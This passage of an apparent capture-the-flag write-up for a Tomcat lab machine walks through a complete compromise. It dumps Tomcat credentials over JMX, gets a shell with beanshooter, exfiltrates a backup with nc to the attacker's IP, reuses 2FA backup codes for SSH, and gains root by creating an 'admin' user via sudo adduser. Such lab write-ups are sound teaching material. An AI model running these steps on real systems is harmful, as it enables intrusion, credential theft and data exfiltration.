[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)  
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)  
[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)  
[+]  
[+] Enumerating tomcat users:  
[+]  
[+]     - Listing 2 tomcat users:  
[+]  
[+]             ----------------------------------------  
[+]             Username:  manager  
[+]             Password:  fhErvo2r9wuTEYiYgt  
[+]             Roles:  
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase  
[+]  
[+]             ----------------------------------------  
[+]             Username:  admin  
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd  
[+]             Roles:  
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

And we got two tomcat logins : `admin:onyRPCkaG4iX72BrRtKgbszd` and `manager:fhErvo2r9wuTEYiYgt`.

We then use `beanshooter.jar` since `java JMI` is indeed running on the Apache Tomcat server to prepare a shell on tomcat :

```bash
>  java -jar ~/tools/jmx/beanshooter.jar standard 10.129.234.57 2222 tonka  
  
[+] Creating a TemplateImpl payload object to abuse StandardMBean  
[+]  
[+]     Deplyoing MBean: StandardMBean  
[+]     MBean with object name de.qtc.beanshooter:standard=146518515994560 was successfully deployed.  
[+]  
[+]     Caught NullPointerException while invoking the newTransformer action.  
[+]     This is expected bahavior and the attack most likely worked :)  
[+]  
[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=146518515994560 from the MBeanServer.  
[+]     MBean was successfully removed.
```

Then, we get the shell on the `tomcat` server via unauthenticated `java RMX` we found on the `java RMI` which is integrated to tomcat :

```bash
>  java -jar ~/tools/jmx/beanshooter.jar tonka shell 10.129.234.57 2222  
  
[tomcat@10.129.234.57 /]$ whoami  
tomcat
```

We try to find the user flag on tomcat :

```bash
[tomcat@10.129.234.57 /]$ id  
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
[tomcat@10.129.234.57 /]$ find -name user.txt 2>/dev/null
```

And after a few seconds, it spits the location and we get the user flag :

```bash
./opt/tomcat/user.txt  
[tomcat@10.129.234.57 /]$ cat ./opt/tomcat/user.txt  
[REDACTED]
```

We got the user flag on tomcat.

Now, since we aren't a user, we'll try to find one to proceed to PrivEsc :

```bash
[tomcat@10.129.234.57 /]$ ls -la /home  
total 16  
drwxr-xr-x  4 root      root      4096 Jun 21  2024 .  
drwxr-xr-x 18 root      root      4096 Jun 26  2025 ..  
drwxr-xr-x  5 karl      karl      4096 Apr 14  2025 karl  
drwxr-xr-x  5 useradmin useradmin 4096 Jun 26  2025 useradmin
```

Well we just got one user and one admin.

```bash
[tomcat@10.129.234.57 /]$ ls -la /home/useradmin  
total 36  
drwxr-xr-x 5 useradmin useradmin 4096 Jun 26  2025 .  
drwxr-xr-x 4 root      root      4096 Jun 21  2024 ..  
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 backups  
lrwxrwxrwx 1 useradmin useradmin    9 Jun 21  2024 .bash_history -> /dev/null  
-rw-r--r-- 1 useradmin useradmin  220 Jun 21  2024 .bash_logout  
-rw-r--r-- 1 useradmin useradmin 3771 Jun 21  2024 .bashrc  
drwx------ 2 useradmin useradmin 4096 Jun 21  2024 .cache  
-r-------- 1 useradmin useradmin  200 Jun 21  2024 .google_authenticator  
-rw-r--r-- 1 useradmin useradmin  807 Jun 21  2024 .profile  
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .ssh  
[tomcat@10.129.234.57 /]$ ls -la /home/useradmin/.ssh  
total 20  
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .  
drwxr-xr-x 5 useradmin useradmin 4096 Jun 26  2025 ..  
-rw------- 1 useradmin useradmin   98 Jun 21  2024 authorized_keys  
-rw------- 1 useradmin useradmin  411 Jun 21  2024 id_ed25519  
-rw-r--r-- 1 useradmin useradmin   98 Jun 21  2024 id_ed25519.pub  
[tomcat@10.129.234.57 /]$ ls -la /home/useradmin/backups
total 12  
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .  
drwxr-xr-x 5 useradmin useradmin 4096 Jun 26  2025 ..  
-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21  2024 backup.tar.gz
```

We open a listener and try to grab some files :


```bash
>  nc -lvnp 1234 > id_ed25519  
Listening on 0.0.0.0 1234
```

```
[tomcat@10.129.234.57 /]$ nc 10.10.14.228 1234 < /home/useradmin/.ssh/id_ed25519  
sh: 1: cannot open /home/useradmin/.ssh/id_ed25519: Permission denied
```

Unfortunately that didn't work. To be expected.

```bash
>  nc -lvnp 1111 > backup.tar.gz  
Listening on 0.0.0.0 1111  
Connection received on 10.129.234.57 36758
```

```bash
[tomcat@10.129.234.57 /]$ nc 10.10.14.228 1111 < /home/useradmin/backups/backup.tar.gz
```

Well, that, at least, worked.

```bash
>  tar -tzf backup.tar.gz  
./  
./.bash_logout  
./.profile  
./.ssh/  
./.ssh/id_ed25519  
./.ssh/authorized_keys  
./.ssh/id_ed25519.pub  
./.bashrc  
./.google_authenticator  
./.cache/  
./.cache/motd.legal-displayed  
./.bash_history
```

That's a juicy backup. We got the ssh key we were looking to grab directly, it seems.

We'll extract it properly in the box's directory I'll make :

```bash
>  mkdir -p ~/htb/manage && tar -xzf backup.tar.gz -C ~/htb/manage  
>  cd ~/htb/manage
>  ls -al
total 32
drwxr-xr-x 4 vagabond vagabond 4096 Jun 21  2024 .
drwxr-xr-x 6 vagabond vagabond 4096 Jun  5 11:54 ..
lrwxrwxrwx 1 vagabond vagabond    9 Jun 21  2024 .bash_history -> /dev/null
-rw-r--r-- 1 vagabond vagabond  220 Jun 21  2024 .bash_logout
-rw-r--r-- 1 vagabond vagabond 3771 Jun 21  2024 .bashrc
drwx------ 2 vagabond vagabond 4096 Jun 21  2024 .cache
-r-------- 1 vagabond vagabond  200 Jun 21  2024 .google_authenticator
-rw-r--r-- 1 vagabond vagabond  807 Jun 21  2024 .profile
drwxr-xr-x 2 vagabond vagabond 4096 Jun 21  2024 .ssh
>  chmod 600 .ssh/id_ed25519
```

So we got what we wanted : the `ssh` key for `useradmin`.

```
>  ssh -i .ssh/id_ed25519 useradmin@10.129.234.57  
The authenticity of host '10.129.234.57 (10.129.234.57)' can't be established.  
ED25519 key fingerprint is: SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.234.57' (ED25519) to the list of known hosts.  
(useradmin@10.129.234.57) Verification code:
```

It seems it asks for a "Verification code". We see `.google_authenticator` in `~/htb/manage`, maybe it's the secret for the authentication, in this case we'll have to enter it manually on an authenticator app.

```bash
>  cat .google_authenticator  
CLSSSMHYGLENX5HAIFBQ6L35UM  
" RATE_LIMIT 3 30 1718988529  
" WINDOW_SIZE 3  
" DISALLOW_REUSE 57299617  
" TOTP_AUTH  
99852083  
20312647  
73235136  
92971994  
86175591  
98991823  
54032641  
69267218  
76839253  
56800775
```

Oh but it looks like we got some `backup` codes. The ultimate contradiction in 2FA authenticator codes : the backup codes that never expire. We can use any of them if the useradmin hasn't used any. Since it's in his backup and he didn't trash them out or write them on paper instead, he must be not paranoïd enough to have used them all to make them expire just for security. So we'll try one at random : `98991823`.

```bash
>  ssh -i .ssh/id_ed25519 useradmin@10.129.234.57  
(useradmin@10.129.234.57) Verification code:    
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Fri Jun  5 10:02:52 AM UTC 2026  
  
 System load:           0.0  
 Usage of /:            73.9% of 4.34GB  
 Memory usage:          47%  
 Swap usage:            0%  
 Processes:             214  
 Users logged in:       0  
 IPv4 address for eth0: 10.129.234.57  
 IPv6 address for eth0: dead:beef::a0de:adff:febe:e6e1  
  
* Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s  
  just raised the bar for easy, resilient and secure K8s cluster deployment.  
  
  https://ubuntu.com/engage/secure-kubernetes-at-the-edge  
  
Expanded Security Maintenance for Applications is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Apps to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
  
useradmin@manage:~$
```

And it worked.

```bash
-bash: cd: /root: Permission denied  
useradmin@manage:/$ sudo -l  
Matching Defaults entries for useradmin on manage:  
   env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User useradmin may run the following commands on manage:  
   (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

Looks like the `useradmin` doesn't have root access. Shameful really. But we can `/usr/sbin/adduser`.

```bash
useradmin@manage:/$ /usr/sbin/adduser --help 2>&1 | head -20  
adduser [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]  
[--firstuid ID] [--lastuid ID] [--gecos GECOS] [--ingroup GROUP | --gid ID]  
[--disabled-password] [--disabled-login] [--add_extra_groups]  
[--encrypt-home] USER  
  Add a normal user  
  
adduser --system [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]  
[--gecos GECOS] [--group | --ingroup GROUP | --gid ID] [--disabled-password]  
[--disabled-login] [--add_extra_groups] USER  
  Add a system user  
  
adduser --group [--gid ID] GROUP  
addgroup [--gid ID] GROUP  
  Add a user group  
  
addgroup --system [--gid ID] GROUP  
  Add a system group  
  
adduser USER GROUP  
  Add an existing user to an existing group
```

```bash
useradmin@manage:/$ sudo /usr/sbin/adduser skuro --system  
[sudo] password for useradmin:
```

It seems we can only create a user without the password, not add any arguments after.

```bash
useradmin@manage:/$ sudo /usr/sbin/adduser arch  
Adding user `arch' ...  
Adding new group `arch' (1005) ...  
Adding new user `arch' (1005) with group `arch' ...  
Creating home directory `/home/arch' ...  
Copying files from `/etc/skel' ...  
New password:    
Retype new password:    
passwd: password updated successfully  
Changing the user information for arch  
Enter the new value, or press ENTER for the default  
       Full Name []:    
       Room Number []:    
       Work Phone []:    
       Home Phone []:    
       Other []:    
Is the information correct? [Y/n] y
```

We only got group `arch` which means we aren't in the `sudoers` group and basically can't do anything.

```bash
useradmin@manage:/$ ls -la /etc/sudoers /etc/sudoers.d/  
ls -la /etc/sudoers.d/  
grep admin /etc/sudoers  
-r--r----- 1 root root 1874 Jun 22  2024 /etc/sudoers  
  
/etc/sudoers.d/:  
total 12  
drwxr-xr-x   2 root root 4096 Aug 10  2023 .  
drwxr-xr-x 104 root root 4096 Jun  5 10:10 ..  
-r--r-----   1 root root 1096 Aug  3  2022 README  
total 12  
drwxr-xr-x   2 root root 4096 Aug 10  2023 .  
drwxr-xr-x 104 root root 4096 Jun  5 10:10 ..  
-r--r-----   1 root root 1096 Aug  3  2022 README  
grep: /etc/sudoers: Permission denied
```

So since there is no admin user yet, only `useradmin`, we'll create admin :

```bash
useradmin@manage:/$ sudo /usr/sbin/adduser admin  
Adding user `admin' ...  
Adding new group `admin' (1006) ...  
Adding new user `admin' (1006) with group `admin' ...  
Creating home directory `/home/admin' ...  
Copying files from `/etc/skel' ...  
New password:    
Retype new password:    
passwd: password updated successfully  
Changing the user information for admin  
Enter the new value, or press ENTER for the default  
       Full Name []:    
       Room Number []:    
       Work Phone []:    
       Home Phone []:    
       Other []:    
Is the information correct? [Y/n] y  
useradmin@manage:/$ su admin  
Password:    
To run a command as administrator (user "root"), use "sudo <command>".  
See "man sudo_root" for details.  
  
admin@manage:/$ sudo -l  
[sudo] password for admin:    
Matching Defaults entries for admin on manage:  
   env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User admin may run the following commands on manage:  
   (ALL) ALL
```

And we got `admin` rights. Maybe it's because we created the `admin` group with the `admin` users, tricking the machine into believing we're actually `admin` just with the name.

```bash
admin@manage:/$ sudo cat /root/root.txt
[REDACTED]
```

And we got the root flag.